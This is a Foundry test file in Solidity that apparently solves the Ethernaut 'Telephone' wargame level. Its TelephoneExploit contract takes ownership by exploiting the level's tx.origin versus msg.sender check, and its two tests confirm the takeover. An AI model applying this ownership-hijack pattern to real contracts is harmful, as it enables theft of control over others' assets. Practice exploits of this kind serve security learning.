//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Telephone} from "../src/level5.sol";
import {Test, console} from "forge-std/Test.sol";

contract TelephoneAttack is Test {
    Telephone public telephone;
    address public attacker = makeAddr("attacker");
    address public player = makeAddr("player");

    function setUp() public {
        vm.deal(player, 10 ether); // Give player some ETH
        vm.deal(attacker, 10 ether);
        vm.startPrank(player); //palyer act as a tx.origin
        telephone = new Telephone();
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(attacker);
        telephone.changeOwner(attacker);
        assertEq(telephone.owner(), attacker, "attacker should be the owner");
        vm.stopPrank();
    }

    //U  can also performs this way also to change the owner
    function test_attack2() public {
        vm.startPrank(player);
        TelephoneExploit exploit = new TelephoneExploit(telephone);
        exploit.attack(attacker);
        assertEq(telephone.owner(), attacker, "attacker should be the owner");
        vm.stopPrank();
    }
}

contract TelephoneExploit {
    Telephone public tel;

    constructor(Telephone _tel) {
        tel = _tel;
    }

    function attack(address _attack) public {
        //this contract act as an msg.sender and tx.origin=player
        tel.changeOwner(_attack);
    }
}
